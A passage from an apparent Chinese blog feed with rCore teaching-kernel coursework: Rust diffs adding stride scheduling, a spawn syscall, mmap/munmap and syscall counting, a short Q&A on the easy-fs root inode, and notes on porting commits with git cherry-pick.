@@ use super::__switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;fetch_task, TaskStatus&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;TaskContext, TaskControlBlock&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -61,6 +62,11 @@ pub fn run_tasks() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;task_inner.task_cx as *const TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            task_inner.task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if task_inner.time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            // release coming task_inner manually</span><span class="token prefix unchanged"> </span><span class="token line">            drop(task_inner);</span><span class="token prefix unchanged"> </span><span class="token line">            // release coming task TCB manually</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex ff5b581..d8c5510 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,10 +1,11 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management &amp; Functions for completely changing TCB</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;kstack_alloc, pid_alloc, KernelStack, PidHandle&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::fs::&#123;File, Stdin, Stdout&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::mm::&#123;MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;BIG_STRIDE, MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;MapPermission, MemorySet, PhysPageNum, VPNRange, VirtAddr, VirtPageNum, KERNEL_SPACE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::&#123;trap_handler, TrapContext&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec;</span></span>@@ -36,6 +37,86 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">        inner.memory_set.token()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Set the schduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.set_prio(prio);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get the schduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_stride(&amp;self) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.stride</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase the stride by pass</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.inc_stride();</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">pub struct TaskControlBlockInner &#123;</span></span>@@ -71,6 +152,18 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub prio: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub stride: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -94,6 +187,13 @@ impl TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            self.fd_table.len() - 1</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;mut self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        self.prio = prio;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;mut self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let pass = BIG_STRIDE / self.prio;</span><span class="token prefix inserted">+</span><span class="token line">        self.stride += pass;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -135,6 +235,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    ],</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: user_sp,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span></span>@@ -216,6 +320,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    fd_table: new_fd_table,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: parent_inner.program_brk,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -231,6 +339,65 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        // ---- release parent PCB</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// parent process spawn the child process</span><span class="token prefix inserted">+</span><span class="token line">    pub fn spawn(self: &amp;Arc&lt;Self>, elf_data: &amp;[u8]) -> Arc&lt;Self> &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut parent_inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        // create a user space based upon elf_data</span><span class="token prefix inserted">+</span><span class="token line">        let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx_ppn = memory_set</span><span class="token prefix inserted">+</span><span class="token line">            .translate(VirtAddr::from(TRAP_CONTEXT_BASE).into())</span><span class="token prefix inserted">+</span><span class="token line">            .unwrap()</span><span class="token prefix inserted">+</span><span class="token line">            .ppn();</span><span class="token prefix inserted">+</span><span class="token line">        // alloc a pid and a kernel stack in kernel space</span><span class="token prefix inserted">+</span><span class="token line">        let pid_handle = pid_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack = kstack_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack_top = kernel_stack.get_top();</span><span class="token prefix inserted">+</span><span class="token line">        // copy fd table</span><span class="token prefix inserted">+</span><span class="token line">        let mut new_fd_table: Vec&lt;Option&lt;Arc&lt;dyn File + Send + Sync>>> = Vec::new();</span><span class="token prefix inserted">+</span><span class="token line">        for fd in parent_inner.fd_table.iter() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(file) = fd &#123;</span><span class="token prefix inserted">+</span><span class="token line">                new_fd_table.push(Some(file.clone()));</span><span class="token prefix inserted">+</span><span class="token line">            &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">                new_fd_table.push(None);</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let task_control_block = Arc::new(TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">            pid: pid_handle,</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack,</span><span class="token prefix inserted">+</span><span class="token line">            inner: unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                UPSafeCell::new(TaskControlBlockInner &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    trap_cx_ppn,</span><span class="token prefix inserted">+</span><span class="token line">                    base_size: user_sp,</span><span class="token prefix inserted">+</span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kernel_stack_top),</span><span class="token prefix inserted">+</span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix inserted">+</span><span class="token line">                    memory_set,</span><span class="token prefix inserted">+</span><span class="token line">                    parent: Some(Arc::downgrade(self)),</span><span class="token prefix inserted">+</span><span class="token line">                    children: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    exit_code: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix inserted">+</span><span class="token line">                    program_brk: parent_inner.program_brk,</span><span class="token prefix inserted">+</span><span class="token line">                    fd_table: new_fd_table,</span><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span><span class="token prefix inserted">+</span><span class="token line">                &#125;)</span><span class="token prefix inserted">+</span><span class="token line">            &#125;,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // add child</span><span class="token prefix inserted">+</span><span class="token line">        parent_inner.children.push(task_control_block.clone());</span><span class="token prefix inserted">+</span><span class="token line">        // modify trap_cx</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx = task_control_block.inner_exclusive_access().get_trap_cx();</span><span class="token prefix inserted">+</span><span class="token line">        *trap_cx = TrapContext::app_init_context(</span><span class="token prefix inserted">+</span><span class="token line">            entry_point,</span><span class="token prefix inserted">+</span><span class="token line">            user_sp,</span><span class="token prefix inserted">+</span><span class="token line">            KERNEL_SPACE.exclusive_access().token(),</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack_top,</span><span class="token prefix inserted">+</span><span class="token line">            trap_handler as usize,</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        task_control_block</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// get pid of process</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn getpid(&amp;self) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.pid.0</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><p><strong>Q:</strong> 在我们的 easy-fs 中，root inode 起着什么作用？如果 root inode 中的内容损坏了，会发生什么？</p><p><strong>A:</strong> root inode 起着根目录的作用，如果 root inode 中的内容（例如文件数据链接 <code>direct</code>、<code>indirect</code> 等）损坏了，可能导致根目录下的文件无法被正常访问。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter5练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/02/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter5%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/02/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter5%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-02T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:00.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h3><p>如果只是想根据特定程序来创建进程，而不需要 <code>fork + exec</code> 组合提供的灵活性（如文件重定位等），那么 <code>spawn</code> 将是一个更简洁且效率更高的选择，本实验要求便是实现它。</p><p>对于 <code>spawn</code> 的实现，确实可以简单地将 <code>fork</code> 和 <code>exec</code> 拼接起来。但需要注意的是，<code>fork</code> 首先拷贝父进程的地址空间，<code>exec</code> 再将该地址空间替换，二者融合后最开始地址空间的拷贝其实是徒劳的。如以下代码所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> memory_set <span class="token operator">=</span> <span class="token class-name">MemorySet</span><span class="token punctuation">::</span><span class="token function">from_existed_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parent_inner<span class="token punctuation">.</span>memory_set<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// futile code!</span><span class="token punctuation">...</span><span class="token keyword">let</span> <span class="token punctuation">(</span>memory_set<span class="token punctuation">,</span> user_sp<span class="token punctuation">,</span> entry_point<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token class-name">MemorySet</span><span class="token punctuation">::</span><span class="token function">from_elf</span><span class="token punctuation">(</span>elf_data<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="stride-调度算法"><a href="#stride-调度算法" class="headerlink" title="stride 调度算法"></a>stride 调度算法</h3><p>实现一个简单的步长调度算法，由于算法思路比较简单，这里直接介绍实现方式。</p><p>首先，为了保存进程的“步长”和优先级信息，需要为进程控制块添加两个字段 <code>stride</code> 和 <code>prio</code>（不考虑性能，为了实现的简单，<code>pass</code> 字段省略，而是在每次增加步长时再计算）。</p><p>在进行调度时（<code>TaskManager.fetch()</code>），需要从进程就绪队列中找到 stride 最小的进程进行调度，并为其 stride 加上对应的 pass，pass 的计算方式是用预先设定的大常数 BigStride 除以进程优先级 prio 得到。这里如果为了效率考虑，就绪队列可以采用优先队列的数据结构，而为了实现的简单，这里选择一次遍历的方式寻找最小值。</p><p>最后，在一个时间片后，重新调度当前 stride 最小的进程。这一时间片轮转策略已经事先实现好，不需要做修改，实现代码如下所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// os/src/task/mod.rs</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">trap_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token operator">!</span> <span class="token punctuation">&#123;</span><span class="token punctuation">...</span>        <span class="token class-name">Trap</span><span class="token punctuation">::</span><span class="token class-name">Interrupt</span><span class="token punctuation">(</span><span class="token class-name">Interrupt</span><span class="token punctuation">::</span><span class="token class-name">SupervisorTimer</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">set_next_trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">suspend_current_and_run_next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">...</span><span class="token punctuation">&#125;</span></code></pre><p>CPU 每个时钟周期都发起一次时钟中断进入内核，内核的 <code>trap_handler</code> 检测到陷入原因是时钟中断，则调用 <code>suspend_current_and_run_next</code> 将当前进程放入就绪队列中，并重新进行调度。</p><h3 id="前向兼容"><a href="#前向兼容" class="headerlink" title="前向兼容"></a>前向兼容</h3><p>从本实验开始，内核必须前向兼容，能够通过前一章的所有测试用例。根据文档提示，可以采用 <code>git cherry-pick</code> 系列命令，将其他分支的 commit 移植到本章分支。使用方法如下：</p><ol><li>合并特定的 commit 到当前分支：<code>git cherry-pick &lt;commit id&gt;</code>。</li><li>若遇到冲突，首先打开冲突文件，如：<code>os/src/syscall/process.rs</code>，编辑文件，解决冲突。</li><li>冲突解决后，标记已解决冲突的文件：<code>git add os/src/syscall/process.rs</code>。重复 2、3 步骤，直至解决完所有的冲突。</li><li>继续 <code>cherry-pick</code> 过程：<code>git cherry-pick --continue</code>。</li></ol><p>这一章由于涉及到任务到进程的转变，框架改动较大，且前面章节修改的代码也不算多，因此我最终还是选择了手动移植。但在后面章节的实验中还是建议使用 cherry-pick.</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/config.rs b/os/src/config.rsindex 5761cdd..b836e56 100644<span class="token coord">--- a/os/src/config.rs</span><span class="token coord">+++ b/os/src/config.rs</span>@@ -23,3 +23,5 @@ pub const TRAP_CONTEXT_BASE: usize = TRAMPOLINE - PAGE_SIZE;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">pub const CLOCK_FREQ: usize = 12500000;</span><span class="token prefix unchanged"> </span><span class="token line">/// the physical memory end</span><span class="token prefix unchanged"> </span><span class="token line">pub const MEMORY_END: usize = 0x88000000;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// big constant for process scheduling</span><span class="token prefix inserted">+</span><span class="token line">pub const BIG_STRIDE: isize = 1000_000;</span></span>\ No newline at end of filediff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 44f20cd..2fa6939 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -1,7 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Implementation of [`FrameAllocator`] which</span><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -134,3 +134,10 @@ pub fn frame_allocator_test() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    drop(v);</span><span class="token prefix unchanged"> </span><span class="token line">    println!("frame_allocator_test passed!");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/os/src/mm/memory_set.rs b/os/src/mm/memory_set.rsindex c3d15f3..dca8551 100644<span class="token coord">--- a/os/src/mm/memory_set.rs</span><span class="token coord">+++ b/os/src/mm/memory_set.rs</span>@@ -60,6 +60,19 @@ impl MemorySet &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            None,</span><span class="token prefix unchanged"> </span><span class="token line">        );</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Remove framed area</span><span class="token prefix inserted">+</span><span class="token line">    pub fn remove_framed_area(&amp;mut self, range: VPNRange) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for area in self.areas.iter_mut() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if area.vpn_range.get_start().0 == range.get_start().0 </span><span class="token prefix inserted">+</span><span class="token line">                &amp;&amp; area.vpn_range.get_end().0 == 